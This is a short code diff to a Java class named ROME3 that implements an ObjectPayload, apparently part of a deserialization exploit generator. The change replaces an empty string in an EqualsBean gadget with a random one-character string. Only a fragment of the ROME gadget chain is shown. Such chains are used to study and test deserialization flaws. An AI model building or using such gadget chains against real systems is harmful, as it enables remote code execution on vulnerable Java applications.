@@ -8,6 +8,7 @@ import com.ppp.secmgr.PayloadRunner;
 import com.ppp.sinks.SinkScheduler;
 import com.ppp.sinks.SinksHelper;
 import com.ppp.sinks.annotation.Sink;
+import com.ppp.utils.RanDomUtils;
 import com.ppp.utils.Reflections;
 import com.sun.syndication.feed.impl.EqualsBean;
 
@@ -45,7 +46,8 @@ public class ROME3 implements ObjectPayload<Object> {
     }
 
     public Object getChain(Class cls, Object object) throws Exception {
-        EqualsBean bean = new EqualsBean(String.class, "");
+        String s = RanDomUtils.generateRandomString(1);
+        EqualsBean bean = new EqualsBean(String.class, s);
 
         Map map1 = new HashMap();
         map1.put("aa", object);
